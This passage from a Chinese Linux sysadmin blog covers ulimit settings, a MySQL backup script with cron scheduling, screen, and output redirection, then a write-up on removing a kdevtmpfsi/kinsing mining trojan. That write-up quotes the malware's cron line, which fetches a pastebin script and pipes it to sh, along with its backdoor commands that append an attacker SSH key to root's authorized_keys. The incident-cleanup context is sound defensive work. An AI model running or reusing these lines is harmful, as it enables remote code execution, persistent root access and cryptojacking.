(sshd is configured to use the wrong authentication system).</p><p>如果以上还不行,直接通过root登录.</p><h2 id="改变当前用户组"><a href="#改变当前用户组" class="headerlink" title="改变当前用户组"></a>改变当前用户组</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -g www-data alterhu2020   (需要重启机器生效)</span><br><span class="line">groups alterhu2020</span><br><span class="line">sudo nano &#x2F;etc&#x2F;sudoers</span><br></pre></td></tr></table></figure><h2 id="unzip命令中文文件名乱码"><a href="#unzip命令中文文件名乱码" class="headerlink" title="unzip命令中文文件名乱码"></a>unzip命令中文文件名乱码</h2><p>采用最新的unzip命令没有参数<code>-O</code>，网上提到的使用参数<code>-O</code>可以指定编码，所以这个访问不能使用。所以使用<code>unar</code>命令:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install unar</span><br><span class="line"></span><br><span class="line">unar -e gb18030 gb18030.zip</span><br></pre></td></tr></table></figure><h2 id="配置linux并发最大打开文件数"><a href="#配置linux并发最大打开文件数" class="headerlink" title="配置linux并发最大打开文件数"></a>配置linux并发最大打开文件数</h2><p>进行目录<code>/etc/profile</code>添加如下配置信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># node环境变量</span><br><span class="line">export PATH&#x3D;&#x2F;opt&#x2F;node&#x2F;node-v12.14.1-linux-armv7l&#x2F;bin:$PATH</span><br><span class="line"></span><br><span class="line"># java环境变量</span><br><span class="line">export JAVA_HOME&#x3D;&#x2F;opt&#x2F;jdk&#x2F;jdk1.8.0_241</span><br><span class="line">export JRE_HOME&#x3D;$JAVA_HOME&#x2F;jre</span><br><span class="line">export PATH&#x3D;$JAVA_HOME&#x2F;bin:$PATH</span><br><span class="line">export CLASSPATH&#x3D;.:$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar</span><br><span class="line"></span><br><span class="line"># 设置pipenv</span><br><span class="line">export PATH&#x3D;$HOME&#x2F;.local&#x2F;bin:$PATH</span><br><span class="line"></span><br><span class="line"># 设置最大文件数,mysql和websock最大连接数</span><br><span class="line">ulimit -u 1048576</span><br><span class="line">ulimit -n 1048576</span><br><span class="line">ulimit -d unlimited</span><br><span class="line">ulimit -m unlimited</span><br><span class="line">ulimit -s unlimited</span><br><span class="line">ulimit -t unlimited</span><br><span class="line">ulimit -v unlimited</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上的配置如果用非root用户双概述可能会出现错误: <code>-bash: ulimit: max user processes: cannot modify limit:</code>. 需要修改对应配置文件: <code>/etc/security/limits.conf</code>, 在文件末尾增加如下配置信息(* 代表的是任意用户,比如root/pi),命令如下:</p><p><code>$ sudo nano /etc/security/limits.conf</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* soft noproc 1048576</span><br><span class="line">* hard noproc 1048576</span><br><span class="line">* soft nofile 1048576</span><br><span class="line">* hard nofile 1048576</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="定时备份mysql数据库，保存7天记录脚本"><a href="#定时备份mysql数据库，保存7天记录脚本" class="headerlink" title="定时备份mysql数据库，保存7天记录脚本"></a>定时备份mysql数据库，保存7天记录脚本</h2><p>脚本参考来源:</p><ul><li><p><a href="https://gist.github.com/tleish/1c6e788c84f59200446b" target="_blank" rel="noopener external nofollow noreferrer">mysql定时备份脚本(推荐)</a></p></li><li><p><a href="https://graspingtech.com/schedule-backup-mysql-databases-ubuntu-16-04/" target="_blank" rel="noopener external nofollow noreferrer">mysql备份脚本</a></p></li><li><p>mysql备份脚本：</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"><span class="meta">#</span><span class="bash">TITLE:            mysql_backup.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash">DESCRIPTION:      script <span class="keyword">for</span> automating the daily mysql backups on development computer</span></span><br><span class="line"><span class="meta">#</span><span class="bash">AUTHOR:           tleish</span></span><br><span class="line"><span class="meta">#</span><span class="bash">DATE:             2013-12-20</span></span><br><span class="line"><span class="meta">#</span><span class="bash">VERSION:          0.4</span></span><br><span class="line"><span class="meta">#</span><span class="bash">USAGE:            ./mysql_backup.sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash">CRON:</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> example cron <span class="keyword">for</span> daily db backup @ 9:15 am</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> min  hr mday month wday <span class="built_in">command</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> 15   9  *    *     *    /opt/backup/scripts/mysql_backup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">RESTORE FROM BACKUP</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">$ gunzip &lt; [backupfile.sql.gz] | mysql -u [uname] -p[pass] [dbname]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> CUSTOM SETTINGS</span></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> directory to put the backup files</span></span><br><span class="line">BACKUP_DIR=/opt/backup</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> MYSQL Parameters</span></span><br><span class="line">MYSQL_UNAME=&quot;syscorer&quot;</span><br><span class="line">MYSQL_PWORD=&quot;s6stest2n3gz&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">credentialsFile=&quot;mysql-credentials.cnf&quot;</span><br><span class="line">echo &quot;[client]&quot; &gt; $credentialsFile</span><br><span class="line">echo &quot;user=$MYSQL_UNAME&quot; &gt;&gt; $credentialsFile</span><br><span class="line">echo &quot;password=$MYSQL_PWORD&quot; &gt;&gt; $credentialsFile</span><br><span class="line">echo &quot;host=localhost&quot; &gt;&gt; $credentialsFile</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Don<span class="string">&#x27;t backup databases with these names</span></span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> Example: starts with mysql (^mysql) or ends with _schema (_schema$)</span></span><br><span class="line">IGNORE_DB=&quot;(^mysql|_schema|sys$)&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> include mysql and mysqldump binaries <span class="keyword">for</span> cron bash user</span></span><br><span class="line">PATH=$PATH:/usr/local/mysql/bin</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Number of days to keep backups</span></span><br><span class="line">KEEP_BACKUPS_FOR=7 #days</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> METHODS</span></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> YYYY-MM-DD</span></span><br><span class="line">TIMESTAMP=$(date +%F)</span><br><span class="line"></span><br><span class="line">function delete_old_backups()</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;Deleting $BACKUP_DIR/*.sql.gz older than $KEEP_BACKUPS_FOR days&quot;</span><br><span class="line">  find $BACKUP_DIR -type f -name &quot;*.sql.gz&quot; -mtime +$KEEP_BACKUPS_FOR -exec rm -rf &#123;&#125; \;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function mysql_login() &#123;</span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="built_in">local</span> mysql_login=<span class="string">&quot;-u <span class="variable">$MYSQL_UNAME</span>&quot;</span></span> </span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$MYSQL_PWORD</span>&quot;</span> ]; <span class="keyword">then</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash">   <span class="built_in">local</span> mysql_login+=<span class="string">&quot; -p<span class="variable">$MYSQL_PWORD</span>&quot;</span></span> </span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="keyword">fi</span></span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="built_in">echo</span> <span class="variable">$mysql_login</span></span></span><br><span class="line">  local mysql_login=&quot;--defaults-extra-file=$credentialsFile&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function database_list() &#123;</span><br><span class="line">  local show_databases_sql=&quot;SHOW DATABASES WHERE \`Database\` NOT REGEXP &#x27;$IGNORE_DB&#x27;&quot;</span><br><span class="line">  echo $(mysql $(mysql_login) -e &quot;$show_databases_sql&quot;|awk -F &quot; &quot; &#x27;&#123;if (NR!=1) print $1&#125;&#x27;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function echo_status()&#123;</span><br><span class="line">  printf &#x27;\r&#x27;; </span><br><span class="line">  printf &#x27; %0.s&#x27; &#123;0..100&#125; </span><br><span class="line">  printf &#x27;\r&#x27;; </span><br><span class="line">  printf &quot;$1&quot;&#x27;\r&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function backup_database()&#123;</span><br><span class="line">    backup_file=&quot;$BACKUP_DIR/$TIMESTAMP.$database.sql.gz&quot; </span><br><span class="line">    output+=&quot;$database =&gt; $backup_file\n&quot;</span><br><span class="line">    echo_status &quot;...backing up $count of $total databases: $database&quot;</span><br><span class="line">    $(mysqldump $(mysql_login) $database | gzip -9 &gt; $backup_file)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function backup_databases()&#123;</span><br><span class="line">  local databases=$(database_list)</span><br><span class="line">  local total=$(echo $databases | wc -w | xargs)</span><br><span class="line">  local output=&quot;&quot;</span><br><span class="line">  local count=1</span><br><span class="line">  for database in $databases; do</span><br><span class="line">    backup_database</span><br><span class="line">    local count=$((count+1))</span><br><span class="line">  done</span><br><span class="line">  echo -ne $output | column -t</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hr()&#123;</span><br><span class="line">  printf &#x27;=%.0s&#x27; &#123;1..100&#125;</span><br><span class="line">  printf &quot;\n&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RUN SCRIPT</span></span><br><span class="line"><span class="meta">#</span><span class="bash">==============================================================================</span></span><br><span class="line">delete_old_backups</span><br><span class="line">hr</span><br><span class="line">backup_databases</span><br><span class="line">hr</span><br><span class="line">printf &quot;All backed up!\n\n&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>复制上面的脚本文件到目录: <code>/opt/backup/scripts/mysql_backup.sh</code>,执行如下命令赋予执行权限：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +x mysql_backup.sh</span><br></pre></td></tr></table></figure><ul><li>执行如下命令，测试脚本是否正常:</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./mysql_backup.sh</span><br></pre></td></tr></table></figure><ul><li>创建<code>Crontab</code>定时任务<br>Usually, you should open your personal crontab file using <code>crontab -e</code> command, however if you are root user and decide to choose system wide crontab file, you need to edit the crontab file located in <code>/etc/crontab</code>.现在创建一个定时脚本每天夜里执行备份操作：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 立即生效</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo crontab -e</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 需要执行重启服务才能生效: sudo systemctl restart cron.service ,不推荐。语法不一样，可能导致不执行</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo nano /etc/crontab</span></span><br></pre></td></tr></table></figure><p>我们知道定时任务可以写到/etc/crontab与crontab -e下面，但你知道两者的区别吗?</p><p>语法不同</p><p>/etc/crontab</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For details see man 4 crontabs</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 ar- 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name  command to be executed</span></span><br></pre></td></tr></table></figure><p> <br> <br>crontab -e</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*  *  *  *  *  <span class="built_in">command</span></span><br></pre></td></tr></table></figure><p>使用范围<br>修改<code>/etc/crontab</code>这种方法只有root用户能用，这种方法更加方便与直接直接给其他用户设置计划任务，而且还可以指定执行shell等等， <code>crontab -e</code>这种所有用户都可以使用，普通用户也只能为自己设置计划任务。然后自动写入/var/spool/cron/usename</p><p>所以推荐使用： <code>sudo crontab -e</code></p><p>按照提示添加最后一行定时脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Running Cron job Daily</span></span><br><span class="line">@daily /opt/backup/scripts/mysql_backup.sh &gt;&gt; /var/log/mysql/mysql-backup.log 2&gt;&amp;1</span><br><span class="line"><span class="meta">#</span><span class="bash"> Running Cron job at 2AM Daily</span></span><br><span class="line">0 2 * * * /opt/backup/scripts/mysql_backup.sh &gt;&gt; /var/log/mysql/mysql-backup.log 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Running Cron job at 12AM &amp; 12PM Daily</span></span><br><span class="line">0 12,24 * * * /opt/backup/scripts/mysql_backup.sh &gt;&gt; /var/log/mysql/mysql-backup.log 2&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>查看执行情况（crontab执行 日志）</li></ul><p>执行结果不论是否成功，都会在 <code>/var/spool/mail/mail</code>文件中有<code>crontab</code>执行日志的记录,另外可以自己指定日志目录，参考后面的命令参数。</p><h2 id="SSH-或者telent登录linux后screen后台运行脚本"><a href="#SSH-或者telent登录linux后screen后台运行脚本" class="headerlink" title="SSH 或者telent登录linux后screen后台运行脚本"></a>SSH 或者telent登录linux后screen后台运行脚本</h2><p>Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。后台运行命令。</p><p>在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。</p><ul><li>安装</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install screen</span><br></pre></td></tr></table></figure><ul><li>命令说明</li></ul><ol><li>执行<code>screen</code>即可打开一个session，或者加上参数<code>-s</code>设置一个session的名称（推荐):</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">screen</span><br><span class="line">screen -S yourname -&gt; 新建一个叫yourname的session</span><br><span class="line">screen -ls         -&gt; 列出当前所有的session</span><br><span class="line">screen -r yourname -&gt; 回到切换yourname这个session</span><br><span class="line">screen -d yourname -&gt; 远程detach某个session</span><br><span class="line">screen -d -r yourname -&gt; 结束当前session并回到yourname这个session</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>快捷键</li></ul><ol><li><p>CTRL - a+d -&gt;(<strong>常用退出切换到后台运行</strong>) detach命令，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。</p></li><li><p><del>CTRL- a+z -&gt; 把当前session放到后台执行，用 shell 的 fg 命令则可回去，基本没有用到</del>。</p></li><li><p><code>screen -X -S 28835 quit</code>-&gt; 删除对应的session，其中的<code>28835</code>是通过命令<code>screen -ls</code>查看到的对应session的id。</p></li></ol><h2 id="shell脚本中-gt-dev-null-2-gt-amp-1"><a href="#shell脚本中-gt-dev-null-2-gt-amp-1" class="headerlink" title="shell脚本中&gt;/dev/null 2&gt;&amp;1"></a>shell脚本中&gt;/dev/null 2&gt;&amp;1</h2><p>参考文档： <a href="https://www.cnblogs.com/youjianjiangnan/p/11561805.html" target="_blank" rel="noopener external nofollow noreferrer">https://www.cnblogs.com/youjianjiangnan/p/11561805.html</a></p><p><code>&gt;/dev/null</code> 这条命令的作用是将标准输出1重定向到/dev/null中。 /dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。那么执行了&gt;/dev/null之后，标准输出就会不再存在，没有任何地方能够找到输出的内容。<br><code>2&gt;&amp;1</code> 这条命令用到了重定向绑定，采用&amp;可以将两个输出绑定在一起。这条命令的作用是错误输出将和标准输出同用一个文件描述符，<strong>说人话就是错误输出将会和标准输出输出到同一个地方</strong>。</p><p>linux在执行shell命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令，所以&gt;/dev/null 2&gt;&amp;1的作用就是让<strong>标准输出重定向到/dev/null中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了/dev/null中，错误输出同样也被丢弃了。执行了这条命令之后，该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中</strong>。</p><h3 id="nohup结合"><a href="#nohup结合" class="headerlink" title="nohup结合"></a>nohup结合</h3><p>我们经常使用nohup command &amp;命令形式来启动一些后台程序，比如一些java服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nohup java -jar xxxx.jar &amp;</span><br></pre></td></tr></table></figure><p>为了不让一些执行信息输出到前台（控制台），我们还会加上刚才提到的&gt;/dev/null 2&gt;&amp;1命令来丢弃所有的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># nohup java -jar xxxx.jar &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>总而言之，在工作中用到最多的就是<code>nohup command &gt;/dev/null 2&gt;&amp;1 &amp;</code>命令</p><h2 id="挖矿木马病毒清理"><a href="#挖矿木马病毒清理" class="headerlink" title="挖矿木马病毒清理"></a>挖矿木马病毒清理</h2><p>问题： 无意在使用<code>top</code>命令的时候发现一个异常进程: <code>kdevtmpfsi</code>,使用<code>ps -aux | grep kdevtmpfsi</code>,发现对应的执行文件路径是: <code>/tmp/kdevtmpfsi</code>. 然后尝试<code>kill -9</code>杀死进程后，再<code>rm -rf /tmp/kdevtmpfsi</code>还是会死而复生。</p><h3 id="木马解析"><a href="#木马解析" class="headerlink" title="木马解析"></a>木马解析</h3><ol><li>木马解析： <a href="https://xz.aliyun.com/t/4386" target="_blank" rel="noopener external nofollow noreferrer">https://xz.aliyun.com/t/4386</a>, <a href="https://my.oschina.net/u/4437985/blog/3168526" target="_blank" rel="noopener external nofollow noreferrer">https://my.oschina.net/u/4437985/blog/3168526</a> (推荐)</li></ol><p>一般在定时任务（<code>crontab -l</code>）中存在异常脚本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@mdw ~]# crontab -l</span><br><span class="line">*&#x2F;15 * * * * （curl -fsSL https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;xmxHzu5P||wget -q -O- https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;xmxHzu5P)|sh</span><br></pre></td></tr></table></figure><p>1). 攻击者通过网络进入第一台被感染的机器(redis未认证漏洞、ssh密码泄露登录等)。<br>2). 第一台感染的机器会读取known_hosts文件，遍历ssh登录，如果是做了免密登录认证，则将直接进行横向传播。<br>3). 修改/etc/cron.d/root文件，增加定时任务<br>4). kill掉同类挖矿进程<br>5). kill掉高好资源的其他进程<br>6). 下载执行主恶意程序kerberods<br>7). 拉起khugepageds挖矿进程<br>8). 为文件添加chattr锁定<br>9). 修改IPTABLES<br>10). 清除日志<br>11). 关闭SELinux<br>12). 还有个后门，创建/root/.ssh/authorized_keys，添加病毒作者自己的公钥，保证其可以使用SSH登录到服务器，具体代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chmod 700 &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">echo &gt;&gt; &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">chmod 600 root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9WKiJ7yQ6HcafmwzDMv1RKxPdJI&#x2F;oeXUWDNW1MrWiQNvKeSeSSdZ6NaYVqfSJgXUSgiQbktTo8Fhv43R9FWDvVhSrwPoFBz9SAfgO06jc0M2kGVNS9J2sLJdUB9u1KxY5IOzqG4QTgZ6LP2UUWLG7TGMpkbK7z6G8HAZx7u3l5+Vc82dKtI0zb&#x2F;ohYSBb7pK&#x2F;2QFeVa22L+4IDrEXmlv3mOvyH5DwCh3HcHjtDPrAhFqGVyFZBsRZbQVlrPfsxXH2bOLc1PMrK1oG8dyk8gY8m4iZfr9ZDGxs4gAqdWtBQNIN8cvz4SI+Jv9fvayMH7f+Kl2yXiHN5oD9BVTkdIWX root@u17&quot; &gt;&gt; &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="木马分析"><a href="#木马分析" class="headerlink" title="木马分析"></a>木马分析</h3><ol><li>继续查看对应的定时任务目录<code>nano /etc/crontab</code>,发现没有对应的病毒形式的定时任务。继续查看用户目录下的定时任务: <code>/var/spool/cron/</code>也没有发现非法的定时任务。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nano &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br><span class="line"></span><br><span class="line">nano &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</span><br><span class="line"></span><br><span class="line">nano &#x2F;etc&#x2F;cron.d&#x2F;root</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><p>这个线程重复启动的原因是<strong>它还有一个守护线程在运行</strong>，检测到这个线程挂掉的时候就去重新启动，从而导致我们周而复始的出现这个问题。PS： 通过 <code>ps -ef</code> 命令查出 <code>kdevtmpfsi</code> 进程号，直接 kill -9 进程号并删除 /tmp/kdevtmpfsi 执行文件。但没有过1分钟进程又运行了，这时就能想到，kdevtmpfsi 有守护程序或者有计划任务。通过 crontab -l 查看是否有可疑的计划任务。</p></li><li><p>找到线程和守护线程<br>根据上面结果知道 kdevtmpfsi 进程号是 10393，使用 <code>systemctl status 10393</code> 发现 <code>kdevtmpfsi</code> 有守护进程<br>kill 掉 kdevtmpfsi 守护进程 kill -9 30903 30904，再 killall -9 kdevtmpfsi 挖矿病毒，最后删除 kdevtmpfsi 执行程序 rm -f /tmp/kdevtmpfsi</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pstree -a</span><br><span class="line">netstat -natp</span><br></pre></td></tr></table></figure><p>这时候我们就可以找到kdevtmpfsi线程 和它的守护线程<code>kinsing</code>.直接kill线程和它的守护线程:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep curl</span><br><span class="line">ps -aux|grep kinsing</span><br><span class="line">ps -aux|grep kdevtmpfsi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kill -9 19128</span><br><span class="line">kill -9 3722</span><br><span class="line">rm -rf &#x2F;tmp&#x2F;kdevtmpfsi</span><br><span class="line">rm -rf &#x2F;var&#x2F;tmp&#x2F;kinsing</span><br><span class="line">find &#x2F; -name &quot;kinsing*&quot; | xargs rm -rf</span><br><span class="line">find &#x2F; -name kdevtmpfsi | xargs rm -rf</span><br><span class="line">rm -f &#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br></pre></td></tr></table></figure><ol start="4"><li>查找可疑定时任务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 首先停止cron服务，避免因其不断执行而导致恶意文件反复下载执行。如果操作系统可以使用service命令</span><br><span class="line">systemctl stop cron</span><br><span class="line">crontab -l 